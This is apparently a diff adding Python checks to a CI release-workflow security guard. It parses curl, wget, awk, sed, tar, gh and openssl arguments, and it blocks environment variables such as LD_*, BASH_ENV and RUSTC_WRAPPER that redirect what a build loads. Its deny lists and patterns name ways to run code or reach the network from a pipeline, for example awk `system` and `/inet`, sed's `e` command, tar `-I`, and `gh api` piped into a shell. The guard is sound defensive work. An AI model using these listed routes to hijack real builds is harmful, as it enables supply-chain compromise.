+def option_problem(word: str, args: List[Tuple[str, bool]], outputs: List[str]) -> str:
+    """Round 7 (N3): "" when every option of one curl or wget call is on its allow-list, else the first one that is
+    not (wget `-e` / `--use-askpass`, curl `-K` and `--config` run or read what the step did not list). The names the
+    call writes are appended to ``outputs``."""
+    curl = word == "curl"
+    urls: List[str] = []
+    named = False
+    n = 0
+    while n < len(args):
+        arg = args[n][0]
+        n += 1
+        if not arg.startswith("-") or arg == "-":
+            if "/" not in arg and ":" not in arg:
+                return f"the {word} argument `{arg[:40]}` (neither an allowed option nor a URL)"
+            urls.append(arg)
+            continue
+        value: Optional[str] = None
+        want = False
+        if arg.startswith("--"):
+            name, eq, val = arg.partition("=")
+            flags, valued = (CURL_LONG_FLAGS, CURL_LONG_VALUE) if curl else (WGET_LONG_FLAGS, WGET_LONG_VALUE)
+            if name in flags and not eq:
+                continue
+            if name not in valued:
+                return f"the {word} option `{arg[:40]}`"
+            want, value = True, (val if eq else None)
+            out_opt = name in ("--output", "--output-document")
+        elif curl:
+            if CURL_SHORT_RE.fullmatch(arg) is None:
+                return f"the curl option `{arg[:40]}`"
+            want, out_opt = arg.endswith("o"), arg.endswith("o")
+        else:
+            attached = WGET_SHORT_ATTACHED_RE.fullmatch(arg)
+            if arg in WGET_SHORT_FLAGS:
+                continue
+            if attached is not None:
+                outputs.append(attached.group(1))
+                named = True
+                continue
+            if WGET_SHORT_VALUE_RE.fullmatch(arg) is None:
+                return f"the wget option `{arg[:40]}`"
+            want, out_opt = True, arg.endswith("O")
+        if want and value is None:
+            if n >= len(args):
+                return f"the {word} option `{arg[:40]}` with no value"
+            value = args[n][0]
+            n += 1
+        if out_opt and value is not None:
+            outputs.append(value)
+            named = True
+    if not curl and not named:  # Round 8 (S2): wget writes the last component of each URL (index.html for a directory URL)
+        outputs.extend(re.split(r"[?#]", u)[0].rstrip("/").rsplit("/", 1)[-1] if not u.endswith("/") else "index.html"
+                       for u in urls)
+    return ""
+
+
+def docker_image(toks: List[str]) -> str:
+    """The image of `docker run|create|pull <toks>`: the first token that is not an option or an option's value."""
+    n = 0
+    while n < len(toks):
+        tok = toks[n]
+        n += 1
+        if tok.startswith("-"):
+            if "=" not in tok and tok in DOCKER_VALUE_OPTS:
+                n += 1
+            continue
+        return tok
+    return ""
+
+
+def base_of(name: str) -> str:
+    """The last path component of a named file, with `${VAR}` folded to `$VAR`."""
+    return norm_name(name).rsplit("/", 1)[-1]
+
+
+def tool_url_problem(word: str, texts: List[str]) -> str:
+    """Round 8 (S8): a tool that can fetch from a URL it is given is refused when an argument is one."""
+    if word in RUN_URL_TOOLS and any(URL_RE.match(a) or re.search(r"=[A-Za-z][A-Za-z0-9+.-]*://", a)
+                                     or (word == "git" and re.match(r"[\w.-]+@[\w.-]+:", a)) for a in texts):
+        return f"`{word}` with a URL argument"
+    return ""
+
+
+# Round 9 (code r8 F1-F4, F10): the policies of awk, sed, tar, gh and openssl read their arguments instead of matching them.
+# decision: refuse sed program files over inspecting them because a program file is content the step may have just
+# fetched and the guard reads only the workflow.
+# decision: every captured gh api or git show output is a download over listing gh as a safe tool because the allow-list
+# design refuses every unlisted fetch and an API body is a fetch.
+GH_API_READONLY = (  # the endpoints `gh api` may read (and only read) in a release workflow
+    re.compile(r"repos/[A-Za-z0-9_.${}-]+(?:/[A-Za-z0-9_.${}-]+)?/pulls/[A-Za-z0-9_${}]+/reviews"),
+)
+GH_API_SINKS = frozenset(("bash", "sh", "zsh", "dash", "python3", "python", "source", ".", "xargs", "sudo", "timeout", "command",
+                          "env", "eval", "exec", "tee", "perl", "ruby", "node"))  # a command that runs or stores what it reads
+GIT_REF_PATH_RE = re.compile(r"[^-\s:][^\s:]*:\S+")  # `git show <ref>:<path>` prints a file of another ref
+TAR_LONG_OK = frozenset((
+    "strip-components", "no-same-owner", "no-same-permissions", "extract", "create", "list", "file", "directory", "gzip",
+    "gunzip", "bzip2", "xz", "verbose", "preserve-permissions", "keep-old-files", "exclude"))
+TAR_RUN_SHORT = frozenset("IF")  # -I runs a compression program, -F an info script
+OPENSSL_CODE_OPTS = ("-engine", "-provider", "-provider-path", "-modulepath")
+SED_FLAG_CHARS = frozenset("gpiImM0123456789")
+SED_SIMPLE_CMDS = frozenset("pdDnNgGhHxP=FzqQlL")
+AWK_REGEX_BEFORE = frozenset("(,;{}!~&|=<>+-*%^?:\n")
+
+
+def awk_problem(args: List[Tuple[str, bool]]) -> str:
+    """Round 9 (F1): "" when the awk program is one this guard can read and it cannot run a command: no `-f`, no variable-held
+    or expanded program, no pipe, `system`, `getline`, `@load`, and a `print` or `printf` redirected only to a literal path."""
+    n = 0
+    while n < len(args):
+        arg = args[n][0]
+        if arg == "--":
+            n += 1
+            break
+        if arg in ("-F", "-v"):
+            n += 2
+            continue
+        if arg.startswith("-F") or arg.startswith("-v"):
+            n += 1
+            continue
+        if arg.startswith("-") and arg != "-":
+            return f"`awk` with the option `{arg[:30]}` (only -F, -v and --; a program file or an extension is refused)"
+        break
+    if n >= len(args):
+        return ""
+    prog, _lit = args[n]
+    if is_exp(prog):
+        return "`awk` with a program held in a variable or built by an expansion (the guard cannot read it)"
+    i, size, depth, in_print, prev = 0, len(prog), 0, False, "\n"
+    while i < size:
+        c = prog[i]
+        if c == '"':
+            j = i + 1
+            while j < size and prog[j] != '"':
+                j += 2 if prog[j] == "\\" else 1
+            if j >= size:
+                return "`awk` with an unterminated string in the program"
+            i, prev = j + 1, '"'
+            continue
+        if c == "/" and prev in AWK_REGEX_BEFORE:
+            j = i + 1
+            while j < size and prog[j] != "/":
+                j += 2 if prog[j] == "\\" else 1
+            if j >= size:
+                return "`awk` with an unterminated regular expression in the program"
+            i, prev = j + 1, "/"
+            continue
+        if c == "#":
+            j = prog.find("\n", i)
+            i = size if j < 0 else j
+            continue
+        if c == "@":
+            return "`awk` with `@load`, `@include` or `@namespace`"
+        if c == "|":
+            if prog[i + 1:i + 2] == "|":
+                i, prev = i + 2, "|"
+                continue
+            return "`awk` with a pipe to or from a command"
+        if c.isalpha() or c == "_":
+            j = i
+            while j < size and (prog[j].isalnum() or prog[j] == "_"):
+                j += 1
+            ident = prog[i:j]
+            if ident in ("system", "getline"):
+                return f"`awk` with `{ident}`, which runs or reads a command or file"
+            if ident in ("print", "printf"):
+                in_print, depth = True, 0
+            i, prev = j, "a"
+            continue
+        if c in "([":
+            depth += 1
+        elif c in ")]":
+            depth -= 1
+        elif c in ";}\n":
+            in_print, depth = False, 0
+        elif c == ">" and in_print and depth <= 0:
+            j = i + (2 if prog[i + 1:i + 2] == ">" else 1)
+            while j < size and prog[j] in " \t":
+                j += 1
+            if prog[j:j + 1] != '"':
+                return "`awk` with a print redirected to a path that is not a literal string"
+            k = j + 1
+            while k < size and prog[k] != '"':
+                k += 2 if prog[k] == "\\" else 1
+            if k >= size:
+                return "`awk` with an unterminated string in the program"
+            target = prog[j + 1:k]
+            k += 1
+            while k < size and prog[k] in " \t":
+                k += 1
+            if k < size and prog[k] not in ";}\n#":
+                return "`awk` with a print redirected to a path that is not a single literal string"
+            if "/inet" in target:
+                return "`awk` with a print to a network special file"
+            i, in_print, prev = k, False, '"'
+            continue
+        i += 1
+        if not c.isspace():
+            prev = c
+    return ""
+
+
+def sed_value_end(script: str, pos: int, delim: str) -> int:
+    """The index of the first unescaped ``delim`` at or after ``pos`` (-1 when there is none)."""
+    while pos < len(script):
+        if script[pos] == "\\":
+            pos += 2
+            continue
+        if script[pos] == delim:
+            return pos
+        pos += 1
+    return -1
+
+
+def sed_script_problem(script: str, exp: bool) -> str:
+    """Round 9 (F2): parse one sed script. ``exp`` is True when an expansion took part in it: then a `$` or a backtick is an
+    expansion, and one at an address, a command or a flag is refused (inside a regex, a replacement or a text it is data)."""
+    size, pos = len(script), 0
+
+    def bad_pos(ch: str) -> bool:
+        return bool(ch) and exp and ch in "$`"
+
+    def rest_of_line(at: int) -> Tuple[str, int]:
+        end = at
+        while end < size and script[end] != "\n":
+            end += 2 if script[end] == "\\" and end + 1 < size else 1
+        return script[at:end], min(end, size)
+
+    while pos < size:
+        while pos < size and script[pos] in " \t\n;":
+            pos += 1
+        if pos >= size:
+            break
+        # addresses
+        for _addr in range(2):
+            ch = script[pos:pos + 1]
+            if bad_pos(ch):
+                return "`sed` with an address that comes from an expansion"
+            if ch.isdigit():
+                while pos < size and script[pos].isdigit():
+                    pos += 1
+                if script[pos:pos + 1] == "~":
+                    pos += 1
+                    while pos < size and script[pos].isdigit():
+                        pos += 1
+            elif ch == "$":
+                pos += 1
+            elif ch in ("/", "\\"):
+                delim = "/"
+                if ch == "\\":
+                    delim = script[pos + 1:pos + 2]
+                    pos += 1
+                    if not delim or delim in "\n\\" or bad_pos(delim):
+                        return "`sed` with an address delimiter the guard cannot read"
+                end = sed_value_end(script, pos + 1, delim)
+                if end < 0:
+                    return "`sed` with an unterminated address"
+                pos = end + 1
+                while pos < size and script[pos] in "IM":
+                    pos += 1
+            elif _addr == 1 and ch in "+~":
+                pos += 1
+                while pos < size and script[pos].isdigit():
+                    pos += 1
+            else:
+                break
+            if _addr == 0 and script[pos:pos + 1] == ",":
+                pos += 1
+                continue
+            break
+        while pos < size and script[pos] in " \t!":
+            pos += 1
+        if pos >= size:
+            return "`sed` with an address and no command"
+        cmd = script[pos]
+        pos += 1
+        if bad_pos(cmd):
+            return "`sed` with a command that comes from an expansion"
+        if cmd in "{}":
+            continue
+        if cmd == "#":
+            _text, pos = rest_of_line(pos)
+            continue
+        if cmd == "s":
+            delim = script[pos:pos + 1]
+            if not delim or delim in "\n\\" or bad_pos(delim):
+                return "`sed` with a substitution delimiter the guard cannot read"
+            first = sed_value_end(script, pos + 1, delim)
+            second = sed_value_end(script, first + 1, delim) if first >= 0 else -1
+            if second < 0:
+                return "`sed` with an unterminated substitution"
+            pos = second + 1
+            while pos < size and script[pos] not in " \t\n;}#":
+                flag = script[pos]
+                if bad_pos(flag):
+                    return "`sed` with a substitution flag that comes from an expansion"
+                if flag == "w":
+                    path, pos = rest_of_line(pos + 1)
+                    if not path.strip() or (exp and ("$" in path or "`" in path)):
+                        return "`sed` with a `w` flag to a path that is not a literal"
+                    break
+                if flag not in SED_FLAG_CHARS:
+                    return f"`sed` with the substitution flag `{flag}` (the `e` flag runs a command)"
+                pos += 1
+        elif cmd == "y":
+            delim = script[pos:pos + 1]
+            if not delim or delim in "\n\\" or bad_pos(delim):
+                return "`sed` with a transliteration delimiter the guard cannot read"
+            first = sed_value_end(script, pos + 1, delim)
+            second = sed_value_end(script, first + 1, delim) if first >= 0 else -1
+            if second < 0:
+                return "`sed` with an unterminated transliteration"
+            pos = second + 1
+        elif cmd in "aic":
+            _text, pos = rest_of_line(pos)
+            continue
+        elif cmd in "rRwW":
+            path, pos = rest_of_line(pos)
+            if not path.strip() or (exp and ("$" in path or "`" in path)):
+                return f"`sed` with a `{cmd}` command on a path that is not a literal"
+            continue
+        elif cmd in ":btTv":
+            while pos < size and script[pos] not in "\n;":
+                pos += 1
+            continue
+        elif cmd in SED_SIMPLE_CMDS:
+            while pos < size and script[pos].isdigit():
+                pos += 1
+        elif cmd == "e":
+            return "`sed` with the `e` command, which runs a command"
+        else:
+            return f"`sed` with the command `{cmd}`, which the guard does not read"
+        while pos < size and script[pos] in " \t":
+            pos += 1
+        if pos < size and script[pos] not in "\n;}#":
+            return f"`sed` with `{script[pos]}` where a command ends (the guard reads one command at a time)"
+    return ""
+
+
+def sed_problem(args: List[Tuple[str, bool]]) -> str:
+    """Round 9 (F2): "" when the options of sed are on the short list (no `-f`, `--file`, `-s`) and every script parses."""
+    scripts: List[Tuple[str, bool]] = []
+    operands: List[Tuple[str, bool]] = []
+    n = 0
+    while n < len(args):
+        arg = args[n][0]
+        n += 1
+        if arg == "--":
+            operands.extend(args[n:])
+            break
+        if arg.startswith("--"):
+            name, eq, val = arg.partition("=")
+            if name in ("--quiet", "--silent", "--regexp-extended", "--posix", "--sandbox", "--null-data", "--unbuffered",
+                        "--binary") and not eq:
+                continue
+            if name == "--in-place":
+                continue
+            if name == "--expression":
+                if eq:
+                    scripts.append((val, is_exp(arg)))
+                elif n < len(args):
+                    scripts.append((args[n][0], is_exp(args[n][0])))
+                    n += 1
+                else:
+                    return "`sed --expression` without a script"
+                continue
+            return f"`sed` with the option `{arg[:30]}` (program files, `-s` and unknown options are refused)"
+        if arg.startswith("-") and len(arg) > 1:
+            k = 1
+            while k < len(arg):
+                ch = arg[k]
+                k += 1
+                if ch in "nErzub":
+                    continue
+                if ch == "i":
+                    break
+                if ch == "e":
+                    if k < len(arg):
+                        scripts.append((arg[k:], is_exp(arg)))
+                    elif n < len(args):
+                        scripts.append((args[n][0], is_exp(args[n][0])))
+                        n += 1
+                    else:
+                        return "`sed -e` without a script"
+                    break
+                return f"`sed` with the option `-{ch}` (program files, `-s` and unknown options are refused)"
+            continue
+        operands.append(args[n - 1])
+    if not scripts:
+        if not operands:
+            return "`sed` without a script"
+        scripts.append((operands[0][0], is_exp(operands[0][0])))
+    merged: List[Tuple[str, bool]] = []
+    for text, exp in scripts:
+        if merged and merged[-1][0].endswith("\\"):
+            merged[-1] = (merged[-1][0] + "\n" + text, merged[-1][1] or exp)
+        else:
+            merged.append((text, exp))
+    for text, exp in merged:
+        reason = sed_script_problem(text, exp)
+        if reason:
+            return reason
+    return ""
+
+
+def tar_problem(texts: List[str]) -> str:
+    """Round 9 (F3): in every `run:`, tar takes the long options of TAR_LONG_OK (spelled in full, so an abbreviation of
+    `--to-command` is refused too) and short options without `-I` or `-F`, which run a program."""
+    for n, arg in enumerate(texts):
+        if arg == "--":
+            continue
+        if arg.startswith("--"):
+            if arg[2:].partition("=")[0] not in TAR_LONG_OK:
+                return f"`tar` with the option `{arg[:40]}` (it can run a program, or the guard does not know it)"
+        elif arg.startswith("-") and len(arg) > 1:
+            if TAR_RUN_SHORT & set(arg[1:]):
+                return f"`tar` with the option `{arg[:40]}` (`-I` and `-F` run a program)"
+        elif n == 0 and TAR_RUN_SHORT & set(arg):
+            return f"`tar` with the option cluster `{arg[:40]}` (`I` and `F` run a program)"
+    return ""
+
+
+def gh_problem(texts: List[str], site: Optional[Tuple["ShellScan", int]]) -> str:
+    """Round 9 (F4): `gh attestation verify`, or `gh api` of one read-only endpoint of GH_API_READONLY with the options
+    --paginate, --slurp and --jq, never piped into a shell or interpreter. A captured body is a download (fetch_problem)."""
+    plain = [a for a in texts if not a.startswith("-")]
+    if plain[:2] == ["attestation", "verify"]:
+        return ""
+    if texts[:1] != ["api"]:
+        return f"`gh {' '.join(plain[:2])[:30]}`, which is neither `gh api` nor `gh attestation verify`"
+    endpoint = ""
+    n = 1
+    while n < len(texts):
+        arg = texts[n]
+        n += 1
+        if arg in ("--paginate", "--slurp"):
+            continue
+        if arg in ("--jq", "-q"):
+            n += 1
+            continue
+        if arg.startswith("--jq="):
+            continue
+        if arg.startswith("-") or endpoint:
+            return f"`gh api` with `{arg[:30]}` (only --paginate, --slurp and --jq of one endpoint)"
+        endpoint = arg
+    if not any(p.fullmatch(endpoint) for p in GH_API_READONLY):
+        return f"`gh api` of `{endpoint[:50]}`, which is not an endpoint of GH_API_READONLY"
+    if site is not None:
+        scan, k = site
+        if scan.info[k]["nxt"] in ("|", "|&") and k + 1 < len(scan.cmds) and (
+                scan.cmds[k + 1][0].rsplit("/", 1)[-1] in GH_API_SINKS or not scan.cmds[k + 1][1]):
+            return "`gh api` piped into a shell, an interpreter or tee"
+    return ""
+
+
+def openssl_problem(args: List[Tuple[str, bool]]) -> str:
+    """Round 9 (F10): an openssl subcommand of RUN_OPENSSL, never an option that loads code (`-engine`, `-provider`, ...), a
+    `-config` of a computed path, or a `dgst -verify` key outside the repository."""
+    texts = [a for a, _l in args]
+    if not texts or texts[0] not in RUN_OPENSSL:
+        return f"`openssl {' '.join(texts[:1])[:30]}`, which is not in RUN_OPENSSL"
+    for n, (arg, _lit) in enumerate(args):
+        name, eq, val = arg.partition("=")
+        if name in OPENSSL_CODE_OPTS:
+            return f"`openssl` with `{name}`, which loads code"
+        if name in ("-config", "-conf", "-verify"):
+            path = val if eq else (args[n + 1][0] if n + 1 < len(args) else "")
+            if not path or is_exp(path) or path.startswith("/") or ".." in path or path.startswith("-"):
+                return f"`openssl` with `{name}` of the path `{path[:40]}`, which is not a literal path of the repository"
+    return ""
+
+
+# Round 9 (sec r8 F2): ONE named list of the variables that pick a program, a linker, a config, a registry or a module
+# for the shell, the linker, cargo, rustc, rustup, a C toolchain or openssl. A `--config` key of cargo that names a program
+# has an environment twin in this list (CARGO_CONFIG_ENV_TWINS keeps the pairs, the self-test checks each).
+DANGEROUS_ASSIGN_NAMES = (
+    r"LD_\w*", r"DYLD_\w*", "BASH_ENV", "ENV", "PATH", "IFS", "PS4", "CDPATH", "SHELLOPTS", "PYTHONPATH", "PYTHONSTARTUP",
+    "NODE_OPTIONS", "PERL5OPT", "PERL5LIB", "RUBYOPT", "RUBYLIB", r"GIT_\w*", r"CURL_\w*", "WGETRC", "TAR_OPTIONS",
+    r"SSL_CERT_\w+", "(?i:https?_proxy|all_proxy|no_proxy)",
+    "RUSTC", "RUSTC_WRAPPER", "RUSTC_WORKSPACE_WRAPPER", "RUSTDOC", r"CARGO_BUILD_RUSTC\w*", r"CARGO_BUILD_RUSTDOC\w*",
+    r"CARGO_TARGET_\w+_(?:LINKER|RUNNER)", "CARGO_HOME", r"CARGO_HTTP_\w+", "CARGO_NET_GIT_FETCH_WITH_CLI",
+    r"CARGO_REGISTRIES_\w+", r"CARGO_ALIAS_\w+", r"CARGO_CONFIG_\w+",
+    "RUSTUP_TOOLCHAIN", "RUSTUP_HOME", "RUSTUP_DIST_SERVER", "RUSTUP_UPDATE_ROOT", "RUSTUP_DIST_ROOT",
+    "CC", "CXX", "LD", "AR", "LINKER", r"CC_\w+", r"CXX_\w+", r"AR_\w+", r"\w+_LINKER", r"(?:C|CXX|CPP|LD)FLAGS(?:_\w+)?",
+    "OPENSSL_CONF", "OPENSSL_MODULES", "OPENSSL_ENGINES",
+)
+DANGEROUS_ASSIGN_RE = re.compile("|".join(DANGEROUS_ASSIGN_NAMES))
+# The flag variables are refused when their value names a linker, a plugin or an unstable option (or is computed).
+RUSTFLAGS_NAME_RE = re.compile(r"RUSTFLAGS|RUSTDOCFLAGS|CARGO_ENCODED_RUSTFLAGS|CARGO_ENCODED_RUSTDOCFLAGS|"
+                               r"CARGO_BUILD_RUSTFLAGS|CARGO_BUILD_RUSTDOCFLAGS|CARGO_TARGET_\w+_RUSTFLAGS")
+RUSTFLAGS_BAD_RE = re.compile(r"linker|link[-_]args?|-Z|plugin|codegen-backend|llvm-args|--sysroot|--config|\$|\{\{|`")
+# The one narrow exemption: the Android NDK toolchain lines of release.yml (`CC_<triple>=$TC/<file of the toolchain dir>`).
+ANDROID_ENV_RE = re.compile(r"(?:(?:CC|CXX|AR)_(?:aarch64_linux_android|armv7_linux_androideabi|x86_64_linux_android|"
+                            r"i686_linux_android)|CARGO_TARGET_(?:AARCH64_LINUX_ANDROID|ARMV7_LINUX_ANDROIDEABI|"
+                            r"X86_64_LINUX_ANDROID|I686_LINUX_ANDROID)_LINKER)")
+ANDROID_VALUE_RE = re.compile(r'"?\$(?:TC|\{TC\})/[A-Za-z0-9_.+-]+"?')
+CARGO_CONFIG_ENV_TWINS = (  # (`cargo --config` key that names a program, a registry or a proxy, a sample of its environment twin)
+    ("build.rustc", "CARGO_BUILD_RUSTC"), ("build.rustc-wrapper", "CARGO_BUILD_RUSTC_WRAPPER"),
+    ("build.rustc-workspace-wrapper", "CARGO_BUILD_RUSTC_WORKSPACE_WRAPPER"), ("build.rustdoc", "CARGO_BUILD_RUSTDOC"),
+    ("build.rustflags", "CARGO_BUILD_RUSTFLAGS"), ("build.rustdocflags", "CARGO_BUILD_RUSTDOCFLAGS"),
+    ("target.x86_64-unknown-linux-gnu.linker", "CARGO_TARGET_X86_64_UNKNOWN_LINUX_GNU_LINKER"),
+    ("target.x86_64-unknown-linux-gnu.runner", "CARGO_TARGET_X86_64_UNKNOWN_LINUX_GNU_RUNNER"),
+    ("target.x86_64-unknown-linux-gnu.rustflags", "CARGO_TARGET_X86_64_UNKNOWN_LINUX_GNU_RUSTFLAGS"),
+    ("net.git-fetch-with-cli", "CARGO_NET_GIT_FETCH_WITH_CLI"), ("http.proxy", "CARGO_HTTP_PROXY"),
+    ("http.cainfo", "CARGO_HTTP_CAINFO"), ("registries.x.index", "CARGO_REGISTRIES_X_INDEX"),
+    ("registries.x.token", "CARGO_REGISTRIES_X_TOKEN"), ("alias.b", "CARGO_ALIAS_B"), ("home", "CARGO_HOME"),
+)
+GITHUB_ENV_RE = re.compile(r"GITHUB_ENV(?![A-Za-z0-9_])")
+GITHUB_PATH_RE = re.compile(r"GITHUB_PATH(?![A-Za-z0-9_])")
+HEX64_RE = re.compile(r"[0-9a-fA-F]{64}")
+DIGEST_VAR_RE = re.compile(r"\$\{?([A-Za-z_]\w*)")
+ENV_DECLARERS = frozenset(("export", "declare", "typeset", "local", "readonly"))
+MATRIX_COMPLEX = "\0complex"  # a matrix value that is a mapping or a sequence (Round 9, F8)
+FETCH_DIR_PREFIX_RE = re.compile(r"(?:\$PWD|\$\{PWD\}|\$GITHUB_WORKSPACE|\$__GHX__|\.)(?=/|$)")
+
+
+def rustflags_bad(name: str, value: Optional[str]) -> bool:
+    """A flag variable whose value (or lack of a readable value) can name a linker, a plugin or an unstable option."""
+    return RUSTFLAGS_NAME_RE.fullmatch(name) is not None and (value is None or RUSTFLAGS_BAD_RE.search(value) is not None)
+
+
+def dangerous_assign(name: str, value: Optional[str] = None) -> bool:
+    """Round 9 (sec r8 F1, F2): True when setting ``name`` to ``value`` changes what a later command loads or runs. The NDK
+    toolchain lines of the Android job (`CC_<triple>=$TC/<file>`) are the one exemption."""
+    if DANGEROUS_ASSIGN_RE.fullmatch(name):
+        return not (ANDROID_ENV_RE.fullmatch(name) and value is not None and ANDROID_VALUE_RE.fullmatch(value))
+    return rustflags_bad(name, value)
+
+
+def env_written_names(scan: "ShellScan") -> set:
+    """The variable names a step writes to GITHUB_ENV with a value that is not a literal 64-hex digest."""
+    out: set = set()
+    if not any(GITHUB_ENV_RE.search(x) for x in scan.targets):
+        return out
+    for word, _lit, args in scan.cmds:
+        if word not in ("echo", "printf"):
+            continue
+        for arg, _l in args:
+            for seg in re.split(r"\\n|\n", arg):
+                m = re.match(r"([A-Za-z_]\w*)=(.*)", seg, re.S)
+                if m and (is_exp(arg) or HEX64_RE.fullmatch(m.group(2)) is None):
+                    out.add(m.group(1))
+    return out
+
+
+def self_made_names(scan: "ShellScan", prior: Iterable[str] = ()) -> set:
+    """Round 9 (F6): the variables a step sets from anything but a literal 64-hex digest (an assignment, a loop variable,
+    export/declare/local, read, printf -v, mapfile, a GITHUB_ENV line), and those of ``prior`` (earlier steps)."""
+    made: set = set(prior)
+    for name, value, exp in scan.assign_vals:
+        if exp or HEX64_RE.fullmatch(value) is None:
+            made.add(name)
+    made.update(scan.for_vars)
+    for word, _lit, args in scan.cmds:
+        texts = [a for a, _l in args]
+        if word in ENV_DECLARERS:
+            for a, _l in args:
+                m = SHELL_ASSIGN_RE.match(a)
+                if m and (is_exp(a) or HEX64_RE.fullmatch(a[m.end():]) is None or m.group(0).endswith("+=")):
+                    made.add(m.group(1))
+        elif word in ("read", "mapfile", "readarray", "getopts"):
+            made.update(a for a in texts if re.fullmatch(r"[A-Za-z_]\w*", a))
+        elif word == "printf":
+            made.update(texts[n + 1] for n, a in enumerate(texts[:-1]) if a == "-v")
+    made.update(env_written_names(scan))
+    return made
+
+
+def captured_fetch(scan: "ShellScan", k: int) -> bool:
+    """Round 9 (F4): command ``k`` is a fetch whose output the step keeps: `gh release download`, `gh run download`, or a
+    `gh api`, `git show <ref>:<path>` or `git archive` with a captured output (`>`, `>>`, `--output`, `-o`)."""
+    word, _lit, args = scan.cmds[k]
+    texts = [a for a, _l in args]
+    plain = [a for a in texts if not a.startswith("-")]
+    if word == "gh" and plain[:2] in (["release", "download"], ["run", "download"]):
+        return True
+    if word == "gh":
+        kind = plain[:1] == ["api"]
+    elif word == "git":
+        kind = plain[:1] == ["archive"] or (plain[:1] == ["show"] and any(GIT_REF_PATH_RE.fullmatch(a) for a in plain[1:]))
+    else:
+        return False
+    if not kind:
+        return False
+    if any(a in ("-o", "--output") or a.startswith("--output=") for a in texts):
+        return True
+    return any(kind_ == ">" and t and not t.isdigit() and not t.startswith("&") and t != "-" and not t.startswith("/dev/")
+               for kind_, t in scan.info[k]["redirs"])
+
+
+def captured_outputs(scan: "ShellScan", k: int) -> List[str]:
+    """The files a captured fetch writes besides its redirects: the `--output` value, or the directory a `gh ... download`
+    fills (every file of it, as "<dir>/*")."""
+    word, _lit, args = scan.cmds[k]
+    texts = [a for a, _l in args]
+    plain = [a for a in texts if not a.startswith("-")]
+    outs: List[str] = []
+    for n, a in enumerate(texts):
+        if a in ("-o", "--output", "-O") and n + 1 < len(texts):
+            outs.append(texts[n + 1])
+        elif a.startswith("--output="):
+            outs.append(a.partition("=")[2])
+        elif a in ("-D", "--dir") and n + 1 < len(texts):
+            outs.append(texts[n + 1].rstrip("/") + "/*")
+    if word == "gh" and plain[:2] in (["release", "download"], ["run", "download"]) and not any(o.endswith("/*") for o in outs):
+        outs.append("./*")
+    return outs
+
+
+def compare_names(scan: "ShellScan", k: int) -> Optional[set]:
+    """Round 9 (F5): the names a top-level `[ "$(sha256sum f | cut ...)" = <64-hex literal> ]` compares (the print-only
+    checksum commands inside a command substitution), or None when command ``k`` is not such a comparison."""
+    word, _lit, args = scan.cmds[k]
+    info = scan.info[k]
+    if word not in ("[", "[[", "test") or not info["top"] or info["neg"] or info["prev"] not in ("\n", ";"):
+        return None
+    if info["nxt"] not in ("\n", ";", ""):
+        return None
+    if not any(a in ("=", "==") for a, _l in args):
+        return None
+    if not any(HEX64_RE.fullmatch(a) and not is_exp(a) for a, _l in args):
+        return None
+    names: set = set()
+    for j, (pword, _pl, pargs) in enumerate(scan.cmds):
+        if pword in FETCH_VERIFIERS and scan.info[j]["sub"] and not is_verify(pword, pargs):
+            names.update(base_of(a) for a, _l in pargs if not a.startswith("-"))
+    return names or None
+
+
+def fetch_dir_of(path: str) -> str:
+    """The directory a path names or lives in, relative to the workspace ("." for the current directory)."""
+    p = norm_name(path)
+    m = FETCH_DIR_PREFIX_RE.match(p)
+    if m:
+        p = p[m.end():].lstrip("/")
+    return p.rpartition("/")[0] or "."
+
+
+def bare_glob(part: str) -> bool:
+    base = part.rsplit("/", 1)[-1]
+    return any(c in base for c in "*?[") and not base.strip("*?[].")
+
+
+def matrix_complex_text(text: str) -> bool:
+    t = text.strip()
+    return t.startswith("{") or re.match(r"\[\s*[\[{]", t) is not None or re.search(r",\s*[\[{]", t) is not None
+
+
+def env_write_problem(scan: "ShellScan") -> str:
+    """Round 9 (sec r8 F1): in EVERY `run:` step, a dangerous inline assignment, `export`, or GITHUB_ENV line is refused.
+    decision: refuse them in every run step of a release job over only in fetch steps because an environment variable
+    that picks a program loads it in any later command and any later step."""
+    for name, value, _exp in scan.assign_vals:
+        if dangerous_assign(name, value):
+            return f"an assignment to `{name}`"
+        if GITHUB_ENV_RE.search(value):
+            return "a copy of GITHUB_ENV into a variable"
+    to_env = any(GITHUB_ENV_RE.search(x) for x in scan.targets)
+    if to_env and scan.heredocs:
+        return "a here-document written to GITHUB_ENV"
+    for k, (word, _lit, args) in enumerate(scan.cmds):
+        texts = [a for a, _l in args]
+        if word in ENV_DECLARERS:
+            for a in texts:
+                m = SHELL_ASSIGN_RE.match(a)
+                if m and dangerous_assign(m.group(1), a[m.end():]):
+                    return f"`{word} {m.group(1)}`"
+        if word == "env" and any(a in ("-i", "--ignore-environment", "-") for a in texts):
+            return "`env -i`"
+        if word in ("echo", "printf"):
+            continue
+        if any(GITHUB_ENV_RE.search(a) for a in texts) or any(
+                GITHUB_ENV_RE.search(t) for kind, t in scan.info[k]["redirs"] if kind != "<"):
+            return f"`{word}` writing GITHUB_ENV"
+    if to_env:
+        for word, _lit, args in scan.cmds:
+            if word not in ("echo", "printf"):
+                continue
+            vals = [a for a, _l in args if not a.startswith("-")]
+            if word == "echo" and any(re.fullmatch(r"-[a-zA-Z]*e[a-zA-Z]*", a) for a, _l in args):
+                return "a GITHUB_ENV write by `echo -e` (its escapes split one argument into lines the guard cannot read)"
+            if word == "printf":
+                vals = vals[:1]
+                if vals and (vals[0].startswith("%") or vals[0].count("=") > 1):
+                    return "a GITHUB_ENV line whose variable name is computed"
+            for val in vals:
+                for seg in re.split(r"\\n|\n", val):
+                    if seg.startswith(("$", "`")):
+                        return "a GITHUB_ENV line whose variable name is computed"
+                    m = re.match(r"([A-Za-z_]\w*)=(.*)", seg, re.S)
+                    if m and dangerous_assign(m.group(1), m.group(2)):
+                        return f"a GITHUB_ENV line for `{m.group(1)}`"
+    return ""
+
+
+def script_problem(word: str, args: List[Tuple[str, bool]]) -> str:
+    """Round 8 (S8): bash, sh, source and python3 run a literal script file of the repository and nothing else:
+    `-c`, `-m`, a here-document or stdin, a computed or absolute path and `..` are refused."""
+    flags = RUN_PY_FLAGS_RE if word == "python3" else RUN_SH_FLAGS_RE
+    n = 0
+    while word != "source" and n < len(args) and flags.fullmatch(args[n][0]):
+        n += 1
+    if n >= len(args) or is_exp(args[n][0]):  # Round 9 (F7): a quoted literal path is a literal
+        return f"`{word}` without a literal script file (`-c`, `-m`, stdin and a here-document are refused)"
+    path = args[n][0]
+    ok = RUN_PY_RE.fullmatch(path) if word == "python3" else RUN_SCRIPT_RE.fullmatch(path)
+    if not ok or ".." in path:
